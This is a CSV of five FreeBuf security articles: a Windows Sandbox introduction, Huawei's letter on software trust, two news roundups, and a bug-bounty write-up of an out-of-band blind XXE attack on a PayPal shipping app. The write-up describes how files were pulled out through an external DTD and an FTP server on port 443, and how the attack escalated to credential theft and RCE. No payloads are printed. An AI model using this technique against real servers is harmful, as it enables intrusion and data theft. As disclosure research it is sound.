author,link,published,text,title
Alpha_h4ck,,2019-01-05,写在前面的话有多少次，当你下载了一个可执行文件之后，你却不敢直接运行它？你是否需要一个干净的Windows安装环境，但是又懒得搭建一台虚拟机呢？为了应对这种场景，微软开发了Windows Sandbox：一款隔离的、临时性的桌面环境，用户可以在这个环境下运行不受信任的软件，而无需担心主机系统受到影响，因为任何安装在Windows Sandbox中的软件就只会在沙盒环境中运行。Windows Sandbox关闭之后，所有的软件和文件都会被永久删除。Windows Sandbox的特点：Windows系统的默认组件、纯净版、一次性使用、安全和高效。依赖条件1、 Windows 10专业版或企业版（InsiderBuild 18305及以上版本）2、 AMD 64位架构3、 BIOS启用虚拟化功能4、 至少4GB RAM（推荐8GB）5、 至少1GB磁盘空间（推荐SSD）6、 至少双核CPU（推荐四核超线程CPU）快速开始1、 安装Windows 10专业版或企业版，InsiderBuild 18305及以上版本。2、 启用虚拟化：a)     如果你使用的是物理设备，确保BIOS中开启了虚拟化功能；b)    如果你使用的是虚拟设备，运行下列PowerShell命令启用嵌套虚拟化功能：Set-VMProcessor -VMName &lt;VMName&gt;-ExposeVirtualizationExtensions $true3、 在控制面板中进入“启用或关闭Windows功能”，选择Windows Sandbox，点击“确定”，重启电脑后即可完成Windows Sandbox的安装：4、 点击“开始”菜单，找到Windows Sandbox，双击运行。5、 从本地主机中复制一个可执行文件。6、 将可执行文件粘贴到Windows Sandbox的运行窗口中。7、 在Windows Sandbox中运行这个可执行文件，或完成程序安装。8、 正常使用该程序。9、 实验或分析完成后，关闭Windows Sandbox应用程序即可。沙盒环境下的所有内容都将被永久删除。注：Windows Sandbox遵循主机的诊断数据设置，所有其他的隐私设置均为默认值。Windows Sandbox内部机制Windows Sandbox基于WindowsContainers（Windows容器）技术实现，WindowsContainers主要适用于云环境，微软基于该技术实现了Windows Sandbox，并将其整合进了Windows 10中。动态生成镜像Windows Sandbox实际上是一款轻量级虚拟机，因此它需要操作系统镜像才可启动。Windows Sandbox其中一个关键性升级，就是它可以使用本地主机的Windows10系统副本，因此用户无需再下载一个新的VHD镜像了。在每次进行安全分析之前，我们都需要一个干净的分析环境，这里我们提出了“动态镜像”的概念：即保存一份纯净版的操作系统镜像，基于这个操作系统镜像做多个镜像拷贝，镜像拷贝文件可修改，但源镜像不可修改。其中的大部分文件均为链接，因此整个操作系统的大小非常小，约为100MB。如果主机没有安装Windows Sandbox，那么系统会将动态镜像以压缩包的形式存储，大小仅为25MB。但是安装之后，动态镜像数据包将会解压并占100MB磁盘空间。智能内存管理内存管理是另一个整合进Windows内核的部分，Windows的管理程序允许单一物理设备分隔成多个共享相同物理硬件的虚拟机。这种方式虽然对传统的服务器负载效果比较好，但它不太适用于那些资源有限的设备，而Windows Sandbox的优势就在于主机可以根据需要来从沙盒系统中回收内存。除此之外，由于Windows Sandbox的运行基本上跟主机操作系统相同，因此Windows Sandbox还可以通过“直接映射”技术来使用跟主机相同的物理内存页面。集成内核调度器对于普通虚拟机，Windows的管理程序主要控制的是运行在虚拟机中的虚拟进程。但Windows Sandbox使用的是一种名叫“集成调度器”的新技术，这种技术允许主机来决定沙箱何时运行。Windows Sandbox采用了独特的调度策略，允许以跟进程调度线程相同的方式来调度沙箱的虚拟处理器。值得一提的是，大家可以把Windows Sandbox当做一个应用程序，但是它却能提供跟虚拟机一样的安全保护。快照和克隆Windows Sandbox的每一次启动其实并不需要花费完整的系统启动资源，因为这里使用了另外两种技术：即“快照”和“克隆”。快照允许我们挂起沙箱环境，并将内存、CPU和设备状态存储在磁盘中。当我们需要一个新的Windows Sandbox实例时，可以直接从磁盘恢复沙箱环境并将其放入内存中，这样显著降低了Windows Sandbox的启动时间。结束语希望大家能够充分利用这个Windows 10自带的沙盒环境，如果使用过程中遇到了任何问题，均可直接向微软提供报告或建议。* 参考来源：microsoft，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM,Windows Sandbox：轻量级桌面环境专为安全运行应用程序而设计
Freddy,,2019-01-03,"日前，任正非签发华为2019年一号文件，任正非在文中指出，华为已经明确将网络安全和隐私保护作为工作的最高纲领。任正非在文件中称，华为将改变行为习惯，追求精品。我们要开放透明、积极和勇于揭示问题并主动推动改进。同时还将上线新的流程、组织和考核机制。以下为任正非签发文件的全文内容：全面提升软件工程能力与实践，打造可信的高质量产品——致全体员工的一封信我今天写信，是要和大家沟通公司如何全面提升软件工程能力和实践。二十年前的IPD变革，重构了我们的研发模式，实现了从依赖个人、偶然性推出成功产品，到制度化、持续地推出高质量产品的转变。至今为止，我们的产品和解决方案已经在170多个国家安全稳定运行，并因此积累和赢得了全球数万客户的信任。今天，我们又处在一个新的起点，全面云化、智能化、软件定义一切等发展趋势，对ICT基础设施产品的可信提出了前所未有的要求。可信将成为客户愿买、敢买和政府接受、信任华为的基本条件。可信不仅仅是产品外在表现的高质量结果，更是产品内在实现的高质量过程，是结果和过程的双重可验证的高质量。而只有全面提升软件工程能力和实践，才有可能打造出可信的高质量产品。公司已经明确，把网络安全和隐私保护作为公司的最高纲领。我们要在每一个ICT基础设施产品和解决方案中，都融入信任、构建高质量，关键内容包括：安全性（Security）：产品有良好的抗攻击能力，保护业务和数据的机密性、完整性和可用性。韧性（Resilience）：系统受攻击时保持有定义的运行状态，包括降级，以及遭遇攻击时快速恢复的能力。隐私性（Privacy）：遵从隐私保护既是法律法规的要求，也是价值观的体现。用户应该能够适当地控制他们的数据的使用方式。信息的使用政策应该是对用户透明的。用户应该根据自己的需要来控制何时接收以及是否接收信息。用户的隐私数据要有完善的保护能力和机制。可靠性和可用性（Reliability&amp; Availability）：产品能在生命周期内长期保障业务无故障运行，具备快速恢复和自我管理的能力，提供可预期的、一致的服务。全面提升软件工程能力和实践，关乎公司未来的生存和发展，与我们每一个人都息息相关。在此，我希望全体员工、特别是软件工程师们主动参与进来，从自己做起，踏踏实实，共同打造可信的高质量产品。我们要转变观念，追求打造可信的高质量产品，不仅仅是功能、特性的高质量，也包括产品开发到交付过程的高质量。我们知道，功能、特性对产品至关重要，我们更知道，进度对满足客户需求也至关重要。今天，我们要把可信作为第一优先级，放在功能、特性和进度之上。除非客户信任我们的产品，否则这些优秀的特性都没有机会发挥价值。我们各级管理者和全体员工都不得以进度、功能、特性等为理由来降低可信的要求，确保可信的要求在执行过程中不变形。我们要从最基础的编码质量做起，视高质量代码为尊严和个人声誉。代码就像是高楼大厦的一砖一瓦，没有高质量的代码，可信的产品就是空中楼阁。我们要优化并遵循公司各种编程规范，遵从架构与设计原则，熟练使用各种编程库和API，编写出简洁、规范、可读性强、健壮安全的代码。我们要深刻理解架构的核心要素，基于可信导向来进行架构与设计。在确保可信的前提下，要在性能、功能、扩展性等方面做好权衡；慎重地定义我们的模块与接口，真正做到高内聚与低耦合；我们要遵循权限和攻击面最小化等安全设计原则，科学设计模块之间的隔离与接口，提升安全性；低阶架构与设计要遵循高阶的架构与设计原则，在充分理解原有架构与设计的情况下，持续优化；我们要熟悉各种设计模式，重用公共成熟组件和服务，避免重复劳动。我们要重构腐化的架构及不符合软件工程规范和质量要求的历史代码。我们知道，再好的架构，其生命力也是有限的。随着时间的推移、环境的变化以及新技术、新功能特性的引入，架构也会腐化。面对腐化了的架构，要毫不犹豫地去重构它。同时主动以可信设计原则为导向，去重构不符合软件工程规范和质量要求的历史代码，提升软件架构的生命力。我们要深入钻研软件技术，尤其是安全技术。软件技术是我们打造产品的基本工具，技术是否先进，技术选择是否合理，将决定我们软件的高度；我们要深入学习架构与设计、编码、测试、安全、可用性、性能、维护性、体验等技术，并科学运用这些技术。我们要遵守过程的一致性。遵守适用的法律法规、遵循业界共识的标准、规范，确保规范到实现的一致性、代码到二进制的一致性。架构要符合架构原则，设计要遵循设计模式，代码要符合编程规范，最终做到需求与实现一致，达成各项对客户的承诺。我们只有脚踏实地做好每一步，才能真正打造出可信的高质量产品。为此，我们要改变行为习惯，追求精品。我们要开放透明、积极和勇于揭示问题并主动推动改进。软件开发是一种创造性和艺术性的工作，需要充分发挥我们的聪明才智和潜力。我们要改变只重视功能结果、不重视代码质量的行为习惯，要严格遵守软件工程规范；改变被动的修修补补；改变碎片化知识获取，主动去学习提升并贡献经验、代码，形成共享知识库。我们需要改变的行为和习惯还有很多，对绝大多数人来讲都将是一个痛苦的转变过程，会脱一层皮，但我相信大家能够迎接这种挑战。更为重要的是，我们将通过变革形成一套适应上述变化的流程、组织与考核机制。我们要完善并增强透明、可回溯和可审计的全流程管理机制，以可信的视角，从初始设计、完整构建到产品生命周期管理，全面提升软件工程能力和实践。我们将全面强化以Committer角色为核心的代码审核和提交机制，代码经过更加严格和系统的审核才能合入版本。为此我们将建立一支更高水平的Committer角色群体，负责软件架构的看护、代码的审核和提交，整体保障合入代码的高质量。我们要变革考核机制，要让架构设计好、代码写得好的人脱颖而出，对编程能力不满足要求的人给予帮助和培训。但任何人如果编写的代码长时间不能合入版本，将会被团队抛弃。过去一百年来，世界上许多成功的公司都因不能适应变化而倒下。要适应外部变化，唯有自我进化，我们必须保持开放和持续变革。董事会已决定，全面提升软件工程能力与实践将以变革的方式来开展，由轮值董事长徐直军总负责,公司初始投入20亿美元,计划用5年时间，在ICT基础设施领域实现为客户打造可信的高质量产品的目标。希望您支持并积极投入到这一伟大的变革。唯有如此，我们才能实现未来的愿景和使命：把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界。本文转载自：IT之家，Freddy整理，转载文章请注明来源。",华为一号文件：网络安全和隐私保护是最高纲领
生如夏花,,2019-01-01,"技术细节和描述：应用程序如果存在解析XML的功能可能会存在XML外部实体注入漏洞，当输入包含对外部实体引用的XML而由不安全配置的XML解析器处理时，会造成漏洞。它会导致机密数据泄露，拒绝服务，服务器端请求伪造风险，以及进行内网端口扫描等其他系统影响。PayPal官方网络应用程序(PayPal Inc – PayPal Multi-Order Shipping Application [Core])则存在此安全漏洞。背景：PayPal Multi-Order Shipping是一种工具，允许一次从PayPal账户打印多达50个国内美国邮政服务运输标签。包括多项服务如下：* 从eBay和/或PayPal导入交易* 手动创建一个或多个ad-hoc标签* 获取订单准备打印标签* 修改订单的送货详细信息* 为订单添加保险和签名确认* 将多个订单合并为一个货件* 还原合并订单* 在“发运订单”选项卡中添加或删除列* 应用程序设置和省时工具* 打印标签和支持文档Carrier Pickup™和装运后管理识别阶段：在通过拦截环境中的请求来测试应用程序的功能时，以下请求引起了我的注意，发现该应用程序是基于XML的，与服务器交换的请求是XML格式的结构化数据。在第一次测试中，我们需要确认实体是以最基本的形式解析的。所以我们用内联实体替换VALUE来分析服务器行为：    返回的响应是无效的输入错误，因此服务器有一个反射点来显示注入的payload，因为XML请求是用户提供的，我测试了基本的XML注入，通过尝试使用注入实体提取文件来检查应用程序的XML处理方法，将读取远程文件回显在客户端。此攻击的思路是声明外部通用实体并引用网络资源或本地的内部文件：    我们注意到应用程序只检查的位置：字符串，数字，CDATA值。不使用从文档内的元数据或实体引用的值。因此，在提交请求后无法获得直接回显。XXE带外通道的利用XXE处理概述：默认情况下，XML解析器通常支持外部引用，外部实体可以引用解析器文件系统上的文件。外部实体通常也可以通过HTTP协议处理程序引用网络资源。向其他系统发送请求的能力可以使易受攻击的服务器用作攻击代理。通过提交合适的有效payload，攻击者可以使应用程序服务器来攻击可以与之交互的其他系统。这可能包括公共第三方系统，同一组织内的内部系统，或应用程序服务器本身的本地环回适配器上可用的服务。根据网络架构，这可能会暴露给外部攻击者无法访问的高度脆弱的内部服务。我们注意到应用程序只检查的位置：字符串，数字，CDATA值。不使用从文档内的元数据或实体引用的值。因此，在提交请求后无法获得直接回显。攻击方法：1.绕过XXE注入点无法直接回显经过多次测试后，我确认没有直接回显通道，但可以强制服务器在响应中显示结果。所以我使用了一种技术，我们使用“DOCTYPE”中的外部实体注入XML payload而不是一般实体，带有SYSTEM关键字的DOCTYPE声明会导致XML解析器从URI读取数据并允许它继续进入文档：应用程序服务器响应了内部服务器错误消息，在我发送请求后，我的服务器从PayPal的内部服务器收到连接： 现在我们确认了外部实体已激活，这意味着允许从被攻击的服务器连接到其他远程系统，并且可以使用外部DTD通过Web请求读取本地文件。这种技术将允许我们从我们控制的主机请求任何网络资源，而资源可以托管在HTTP服务器，FTP服务器等上。1.通过带外XXE参数实体搜索数据：为了克服解析限制，例如（有限使用外部实体，在主XML文档中引用通用/参数实体），我想到：* 在DTD定义中使用参数实体。* 使服务器与我的外部域交互并解析XXE payload，而不是直接在XML文档中执行攻击。可以通过仅引用托管的DTD资源来执行此攻击。只要服务器处理XML请求，该请求甚至不必包含任何XML主体。A.通过协议处理程序进行XXE数据搜索：参数实体帮助我们使用上述技术通过外部实体访问来从被攻击的服务器中向外部服务器传输文件资源内容。虽然解析器存在漏洞，但不支持直接输出回显。现在的目标是访问服务器的内部本地文件/资源（文件泄露），利用支持各种URL方案/协议的许多平台/解析器中使用的协议处理程序（封装）：从目标应用程序执行数据提取并连接到我的服务器以获取DTD，然后发送文件内容。假设有严格的防火墙限制，我测试了不同的协议处理程序和公共端口（21,23,80,443,8080，…）然后我意识到目标服务器阻止到某些TCP端口的传出连接，例如：21（FTP），8080,8000,1337,2222 ……等。但是，我们仍然可以选择通过HTTP / HTTPS请求将任意文件提取回受控域。在提取“/etc/passwd”文件之后，经过几次尝试，几秒钟就会打开连接并收到文件内容：注意到URL中发送的数据长度几乎肯定是有限的，这取决于某些特定的实现，这就是为什么使用这种方法只能读取一行/etc/passwd的内容。URL通常必须由正确形成的Unicode数据组成，并且还必须符合特定XML库对URL中允许的字符的限制。有时解析器不会检查创建的URI的长度，并且许多解析器会自动转换换行符（Xerces用空格替换它们，而System.XML进程用URL编码替换）。B.Bypass URI长度和服务器防火墙限制：考虑以下：* 控制将在我们受控服务器侧检查的数据块长度。* 从易受攻击的服务器建立到远程系统的连接，可以使用外部DTD来泄露数据。* 使用PayPal远程服务器控制TCP通信协议。* 模拟自定义服务器并监听端口，包括（HTTPS，HTTP）。因此，为了克服此限制而不是来设置HTTP服务器的配置，我使用了一种技术来欺骗目标服务器以开启与端口443（https）上的自定义FTP服务器的连接，来自多行URI的每一行将作为单独的命令被请求。XML解释器解析外部DTD文件后，要读取的文件内容将发送到自定义FTP服务器上，并仅在一个请求中收集到所有数据。因此，我们的最终payload：POC源代码：自定义FTP服务器 https://github.com/Gitr007/Bug-Bounty-Vulnerability-Research/blob/master/Paypal%20MultiOrder%20Shipping%20XXE/custom_ftp_server.rbHTTP服务器 https://github.com/Gitr007/Bug-Bounty-Vulnerability-Research/blob/master/Paypal%20MultiOrder%20Shipping%20XXE/http_server.py在fuzz更多功能之后，我可以利用带外XXE来发现一些文件，并且可以进行更多的攻击。这种风险使远程攻击者（没有特权或用户交互）访问PayPal服务器及其内部系统。远程执行代码场景：这种后果非常危险，攻击者能够有效地绕过严格的防火墙，授权方案，造成敏感数据泄露和PayPal内部网络访问。在我们的案例中，我在运行XXE之后成功地将任何类型的数据泄露到我的外部服务器，这使我能够看到目标系统并识别已安装的应用程序，从而获得RCE的立足点。我想方法来读取配置文件，服务器日志文件，用户历史记录和内部主机信息等。由于PayPal信息的敏感性，我不允许分享RCE利用部分。1. 通过历史记录日志访问Web管理门户：2. 检查历史日志的内容（例如：~/.bash_history），查找已部署的服务。3. 执行本地系统文件扫描。4. 确定Apache Tomcat应用程序。5. 通过XXE进行探测来发送Apache Tomcat配置文件，身份验证凭据返回给我们的服务器。6. 在配置中找到URL后，Web浏览器将访问Web管理控制台。7. 确认RCE，授予访问权限。*参考链接：r00thunt，由生如夏花编译，转载请注明来自FreeBuf.COM",带外通道（OOB）Bind XML外部实体注入漏洞：PayPal案例研究
Freddy,,2018-12-29,各位Buffer早上好，今天是 2018 年 12 月 29 日星期六。今天的早餐铺内容有：研究人员放出Microsoft Edge内存漏洞利用代码；法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发；澳洲西悉尼大学推出网络安全与行为学位；黑客利用攻击软件侵入平罗政府信息网站，获刑9个月；Android自带浏览器会泄露系统敏感信息，包括漏洞修没修。研究人员放出Microsoft Edge内存漏洞利用代码此前，Microsoft Edge浏览器被曝存在内存漏洞，可实现计算机上的远程代码执行。该安全漏洞影响Chakra，它一个支持Edge的JavaScript引擎，可能允许攻击者以与登录用户相同的权限在计算机上运行任意代码。网络攻击者可以将恶意负载托管在一个特制网站旨在通过Microsoft Edge利用漏洞的特制网站，然后诱使用户查看该网站来自phoenhex漏洞研究团队的Bruno Keith表示，该漏洞已被微软标记为“中等”严重性漏洞，影响大多数操作系统。上次被标记为“中等”严重性的系统漏洞是Windows Sever 2019和2016上发现的。本次发布的概念验证代码共有71行，可导致一个边界（OOB）存储器读取泄漏，这不会导致任何实质性的损害。但攻击者可以修改代码实施其他形式的攻击。[来源：bleepingcomputer]法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发12月23日，有人在法国VirusTotal平台上传了一个全新的Shamoon 3蠕虫变种，使用已过期的百度证书签发，该证书于2015年3月25日发布， 并于2016年3月26日到期。该变种使用商业工具Enigma第4版进行封装。来自Anomali实验室的研究人员对该变种进行了分析，发现它使用燃烧的美元图像和儿童图像。专家认为Shamoon 3变种不一定来自最初的制作者，可能是其他人基于Shamoon 2变种修改的。为了欺骗受害者，攻击者在文件描述中使用了内部文件名“Baidu PC Faster”和“Baidu WiFi Hotspot Setup”。[来源：securityaffairs]澳洲西悉尼大学推出网络安全与行为学位为解决全球网络安全与情报方面的技术短缺，西悉尼大学已推出网络安全与行为学位。据Careers360 12月26日报道，福布斯预测，网络安全行业在2021年以前将有350万空缺岗位。去年印度成为仅次于美国与中国的最易受网络威胁的国家。未来的网络安全将取决于人类是否能够尽快创新解决方案，努力确保公司、国家与个人的数据安全。西悉尼大学的网络安全与行为学位是澳大利亚与亚太地区第一个网络安全学位，该学位同时分析技术与人类行为，以帮助学生在数字世界中拥有竞争优势。该跨学科课程将心理理论与研究应用于决策，人为失误，社会影响，组织文化与弱势群体，以及计算机与网络安全的培训——这些都是保护数据免受网络攻击的必需技能。[来源：E安全]黑客利用攻击软件侵入平罗政府信息网站，获刑9个月近日，平罗法院审理了一起利用非法扫描攻击软件侵入政府信息网站的案件，董大风（化名）因犯非法侵入计算机信息系统罪，获刑9个月。今年3月至4月，董大风通过租赁境外网络虚拟主机，远程运行其在网络上下载的捕获网站域名软件和扫描软件，欲利用扫描到的网站漏洞，对网站进行攻击，在多次对平罗县政府信息网站扫描时，被防火墙拦截。网站技术人员发现该问题后及时报警，两天后平罗县公安局民警在厦门高崎国际机场将董大风抓获归案。平罗法院审理后认为，董大风违反国家法律规定，侵入国家事务的计算机系统，对政府网站的安全构成威胁，其行为已触犯刑法，构成非法侵入计算机信息系统罪。董大风到案后如实供述自己的罪行，系坦白，依法可以从轻处罚。鉴于董大风认罪悔罪，其犯罪行为未造成重大危害后果，结合其犯罪情节、性质等，依法对其判处有期徒刑9个月。[来源：银川晚报]Android自带浏览器会泄露系统敏感信息，包括漏洞修没修网络安全咨询公司Nightwatch发现，谷歌的Chrome浏览器、WebView和Android的Chrome标签显示了有关运行它的设备的硬件型号，固件版本和安全补丁级别的信息。这也会影响使用Chrome呈现网络内容的所有Android应用程序。此信息可用于跟踪用户和指纹设备。它还可用于确定特定设备易受攻击的漏洞，以便针对攻击。虽然供应商（Google）在2015年拒绝了最初的错误报告，但他们已于2018年10月针对Chrome v70发布了部分修复程序。该修复程序隐藏固件信息，同时保留硬件模型标识符。所有先前版本都会受到影响。建议用户升级到70或更高版本。由于此修复程序不适用于WebView用法，因此应用程序开发人员应手动覆盖其应用程序中的用户代理配置。[来源：黑客视界]*Freddy编译整理，转载请注明来自FreeBuf.COM,BUF早餐铺 | 研究人员放出Microsoft Edge内存漏洞利用代码；法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发；澳洲西悉尼大学推出网络安全与行为学位
AngelaY,,2018-12-27,各位Buffer早上好，今天是 2018 年 12 月 27 日星期四。今天的早餐铺内容有：苹果App Store打开困难，疑似服务器圣诞宕机；微软为IE发布补丁，却导致部分联想笔记本电脑无法启动；黑客发起大规模钓鱼攻击，绕过 Gmail 和 Yahoo 的 2FA 认证并入侵账户；爆发 18 个月后，WannaCry仍然潜伏在受感染的计算机上；网信办发布《金融信息服务管理规定》。        以下请看详细内容：苹果App Store打开困难 疑似服务器圣诞宕机12月26日上午，不少国内用户通过微博反馈，苹果公司的App Store应用商店出现打开缓慢，甚至无法打开的情形。早上8点左右，微博上开始陆续出现用户反馈，基本都是长时间停留在载入页面，最终显示“无法连接到App Store”的提示。但在苹果系统状态查询页面，显示App Store是正常状态。　一些外媒认为，可能是圣诞节很多人会收到了iPhone当礼物，导致激活和下载App比平时更多，压垮了服务器。但目前尚无法确定是不是这个原因。此问题似乎并没影响到全部用户，在微博上，大约半数用户反馈他们能正常打开。[来源：新浪数码]微软为IE发布补丁，却导致部分联想笔记本电脑无法启动几天前微软发布了一个针对Internet Explorer的紧急 补丁，用于修复浏览器中的零日漏洞。但似乎该补丁本身也存在问题，具体来说，有一些联想笔记本电脑的用户发现，在安装KB4467691补丁后，他们无法启动电脑。在发布补丁时，微软就表示会导致旧版Windows 10出现一些问题，例如，.NET框架问题，以及“开始”菜单中的Web链接问题。但微软后来又更新了补丁页面，以说明补丁会导致某些联想笔记本电脑出现进一步的潜在问题，微软称，“安装KB4467691后，Windows可能无法在RAM少于8    GB的某些联想笔记本电脑上启动。”微软接着为遇到问题的用户提出了几种可能的解决方法：使用统一可扩展固件接口（UEFI）重新启动受影响的计算机，禁用安全启动然后重新启动。如果您的计算机上启用了BitLocker，则可能必须在禁用安全启动后进行BitLocker恢复。微软表示，他们“正在与联想合作，并将在即将发布的版本中提供更新”。[来源：ithome]黑客发起大规模钓鱼攻击，绕过 Gmail 和 Yahoo 的 2FA 认证并入侵账户Amnesty International 公司近日发布报告，分析了 2017-2018年攻击者针对 Gmail 和 Yahoo 等邮箱账户所发起大规模钓鱼攻击。通过钓鱼邮件，攻击者可以绕过这些邮箱的 2FA 认证，影响到大量中东和北非用户。当前的 2FA 认证主要将短信作为第二项验证方式，而攻击者所发布的钓鱼邮件通过伪造成“账户遭遇入侵”的提醒，诱导用户点击链接输入 2FA 验证码以修改账户信息。通过这种方式，攻击者获取到 2FA 验证信息进而真正入侵账户。[来源：securityaffairs]爆发 18 个月后，WannaCry仍然潜伏在受感染的计算机上自 2017 年 WannaCry 大规模爆发之后，至今已经 18 个月。但研究人员近期披露称，WannaCry 仍然潜伏在大量被感染的计算机中。目前，原本用于阻止 WannaCry 的“死亡开关（kill switch）”一周内仍会收到来自 194 个不同国家的 63 万个独立 IP 的连接请求，累计次数超过 1700 万。这意味着，全球几乎所有国家都依旧遭遇WannaCry 的感染。其中，中国、印度尼西亚、越南首当其冲。[来源：bleepingcomputer]网信办发布《金融信息服务管理规定》国家互联网信息办公室2018年12月26日公布《金融信息服务管理规定》（以下简称规定）。规定主要是为了加强金融信息服务内容管理，提高金融信息服务质量，促进金融信息服务健康有序发展，保护自然人、法人和非法人组织的合法权益，维护国家安全和公共利益。在中华人民共和国境内从事金融信息服务，应当遵守该规定。规定要求金融信息服务提供者应当履行主体责任，配备与服务规模相适应的管理人员、建立信息内容审核、信息数据保存、信息安全保障、个人信息保护、知识产权保护等服务规范。同时还规定了其他相关责任和禁止事项，明确了监管部门与责任主体。“规定”的具体内容可参照网信办原发布文件。[来源：网信办],BUF早餐铺 | 微软发布IE补丁导致部分联想笔记本电脑无法启动；WannaCry仍在潜伏；网信办发布《金融信息服务管理规定》
